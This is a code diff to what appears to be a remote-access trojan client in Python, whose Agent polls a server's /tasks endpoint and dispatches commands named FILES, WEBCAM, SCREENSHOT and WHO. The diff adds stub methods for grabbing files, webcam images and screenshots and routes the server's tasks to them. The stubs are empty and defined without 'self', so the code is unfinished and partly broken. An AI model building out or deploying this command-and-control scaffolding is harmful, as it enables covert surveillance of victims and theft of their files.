@@ -30,7 +30,18 @@ class Agent():
         
         except ValueError as e:
             print(f"[-] FATAL ERROR: {e}")
-     
+    
+    
+    def get_screenshot():
+        pass
+
+    def get_webcam():
+        pass
+
+    def get_files():
+        pass  
+    
+    
 me = Agent()
        
     
@@ -68,15 +79,21 @@ def connect(url):
 
         time.sleep(3)
 
+
+
+
+
+
+
 def task_check(url):
     try:
         res = requests.post(url+"/tasks", json={"id" : me.id}, timeout=5)
         data = res.json()
         task = data.get("task")
         if task == "NONE": return False
-        elif task == "FILES": print("FILES")
-        elif task == "WEBCAM": print("WEBCAM")
-        elif task == "SCREENSHOT": print("SCREENSHOT")
+        elif task == "FILES": me.get_files()
+        elif task == "WEBCAM": me.get_webcam()
+        elif task == "SCREENSHOT": me.get_screenshot()
         elif task == "WHO": connect(url)
         
     except requests.exceptions.ConnectionError:
